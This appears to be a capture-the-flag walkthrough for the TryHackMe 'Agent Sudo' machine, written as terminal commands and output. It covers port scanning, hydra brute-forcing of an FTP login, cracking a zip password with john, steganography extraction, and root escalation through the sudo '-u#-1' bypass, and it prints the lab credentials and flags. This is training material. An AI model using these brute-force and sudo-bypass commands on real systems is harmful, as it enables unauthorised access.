#Easy  #TryHackMe #linux 
# Enum
## nmap
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef1f5d04d47795066072ecf058f2cc07 (RSA)
|   256 5e02d19ac4e7430662c19e25848ae7ea (ECDSA)
|_  256 2d005cb9fda8c8d880e3924f8b4f18e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: 400 Bad Request
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


┌──(root㉿kali)-[~]
└─# gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thm/ -t 50 --append-domain
	Found: gc._msdcs.thm Status: 400 [Size: 422]
	
## nmap
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef1f5d04d47795066072ecf058f2cc07 (RSA)
|   256 5e02d19ac4e7430662c19e25848ae7ea (ECDSA)
|_  256 2d005cb9fda8c8d880e3924f8b4f18e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: 400 Bad Request
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

# Exploit
![[Pasted image 20230429071357.png]]
┌──(root㉿kali)-[~]
└─# hydra -t 1 -l chris -P /usr/share/wordlists/rockyou.txt -vV 10.10.0.20 ftp
	[21][ftp] host: 10.10.0.20   login: chris   password: crystal

# Find
ftp creds = [chris] : [crystal]

┌──(root㉿kali)-[/media/sf_kali_partage/challenge/THM/Agent_sudo]
└─# cat To_agentJ.txt 
	Dear agent J,
	All these alien like photos are fake! Agent R stored the real picture inside your directory. [Your login password is somehow stored in the fake picture]. It shouldn't be a problem for you.
	From,
	Agent C

┌──(root㉿kali)-[/home/kali/Desktop]
└─# binwalk --run-as=root -e cutie.png
	DECIMAL       HEXADECIMAL     DESCRIPTION
	0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
	869         0x365         Zlib compressed data, best compression
	WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
	34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
	34820         0x8804          End of Zip archive, footer length: 22

┌──(root㉿kali)-[/media/…/challenge/THM/Agent_sudo/_cutie.png.extracted]
└─# binwalk 8702.zip
	DECIMAL       HEXADECIMAL     DESCRIPTION
	`-----------------------------------------------`
	0             0x0             Zip archive data, [encrypted compressed] size: 98, uncompressed size: 86, name: To_agentR.txt
	258           0x102           End of Zip archive, footer length: 22
	
┌──(root㉿kali)-[/media/…/challenge/THM/Agent_sudo/_cutie.png.extracted]
└─# zip2john 8702.zip > 8702.zip.hash

┌──(root㉿kali)-[/media/…/challenge/THM/Agent_sudo/_cutie.png.extracted]
└─# john 8702.zip.hash -wordlist=/usr/share/wordlists/rockyou.txt
	alien            (8702.zip/To_agentR.txt)

┌──(root㉿kali)-[/media/…/challenge/THM/Agent_sudo/_cutie.png.extracted]
└─# 7z x 8702.zip -p'alien'

┌──(root㉿kali)-[/media/…/challenge/THM/Agent_sudo/_cutie.png.extracted]
└─# cat To_agentR.txt 
	Agent C,
	We need to send the picture to '[QXJlYTUx]' as soon as possible!
	By,
	Agent R

┌──(root㉿kali)-[/usr/share/seclists/Usernames]
└─# echo [QXJlYTUx] | base64 -d
	[Area51] 

┌──(root㉿kali)-[/media/sf_kali_partage/challenge/THM/Agent_sudo]
└─# steghide extract -sf cute-alien.jpg
	Enter passphrase: 
	wrote extracted data to "[message.txt]".

┌──(root㉿kali)-[/media/sf_kali_partage/challenge/THM/Agent_sudo]
└─# cat message.txt  
	Hi [james],
	Glad you find this message. Your login password is [hackerrules!]
	Don't ask me why the password look cheesy, ask agent R who set this password for you.
	Your buddy,
	chris

### creds = [james] : [hackerrules!]

# FootHold
[james@agent-sudo:~$] ls
	Alien_autospy.jpg  user_flag.txt

[james@agent-sudo:~$] cat user_flag.txt 
	b03d975e8c92a7c04146cfa7a5a313c7

### get Alien_autospy.jpg
┌──(root㉿kali)-[/media/sf_kali_partage/challenge/THM/Agent_sudo]
└─# scp james@thm:/home/james/Alien_autospy.jpg /media/sf_kali_partage/challenge/THM/Agent_sudo
	james@thm's password: 
	Alien_autospy.jpg                                                    100%   41KB  30.0KB/s   00:01

### Alien_autospy.jpg content hidden info
┌──(root㉿kali)-[/media/sf_kali_partage/challenge/THM/Agent_sudo]
└─# steghide extract -sf Alien_autospy.jpg                                                     
	Enter passphrase: 

[james@agent-sudo:~$] sudo -l
	[sudo] password for james: 
	User james may run the following commands on agent-sudo:
	    [(ALL, !root) /bin/bash]

# PrivEsc
[james@agent-sudo:~$] sudo -u#-1 bash
	[sudo] password for james: 
[root@agent-sudo:~#] cat /root/root.txt 
	To Mr.hacker,
	Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
	Your flag is 
	b53a02f55b57d4439e3341834d70c062
	By,
	DesKel a.k.a Agent R